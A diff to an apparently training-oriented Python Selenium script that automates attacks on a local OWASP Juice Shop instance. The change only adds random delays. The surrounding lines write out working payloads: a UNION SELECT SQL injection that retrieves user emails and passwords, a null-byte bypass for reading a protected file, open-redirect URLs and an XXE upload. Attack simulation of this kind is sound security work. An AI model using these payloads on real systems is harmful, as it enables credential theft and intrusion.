@@ -132,6 +132,7 @@ class XXEAttack(Attack):
         # 3. type command and upload file
         self.driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(random_comment(2))
         self.driver.find_element_by_xpath('//*[@id="file"]').send_keys(os.getcwd()+"/Scenarios/xxe_tier1.xml")
+        random_sleep()
         self.driver.find_element_by_xpath('//*[@id="submitButton"]').click()
 
         return
@@ -203,6 +204,7 @@ class SiteVisitingAttack(Attack):
             print ("ENTER REDIRECT 1 ATTACK")
 
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/redirect?to=https://gratipay.com/juice-shop")
+        random_sleep()
 
         return
 
@@ -212,6 +214,7 @@ class SiteVisitingAttack(Attack):
             print ("ENTER REDIRECT 2 ATTACK")
 
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop")
+        random_sleep()
 
         return
 
@@ -221,7 +224,8 @@ class SiteVisitingAttack(Attack):
             print ("ENTER FIND EASTER EGG ATTACK")
     
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
-    
+        random_sleep()
+
         return
 
 
@@ -230,6 +234,7 @@ class SiteVisitingAttack(Attack):
             print ("ENTER ACCESS SIGNATURE FILE ATTACK")
 
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/ftp/suspicious_errors.yml%2500.md")
+        random_sleep()
 
         return
 
@@ -239,6 +244,7 @@ class SiteVisitingAttack(Attack):
             print ("ENTER UNDEFINE LANGUAGE ATTACK")
 
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/i18n/tlh_AA.json")
+        random_sleep()
 
         return
 
@@ -312,6 +318,7 @@ class SQLAttack(Attack):
             print ("ENTER RETRIEVE USER CREDENTIALS ATTACK")
 
         self.driver.get("http://localhost:" + str(config[self.attackType + "_port"]) + "/rest/product/search?q=qwert')) UNION SELECT '1', id, email, password, '5', '6', '7', '8' FROM Users--")
+        random_sleep()
 
         return
 
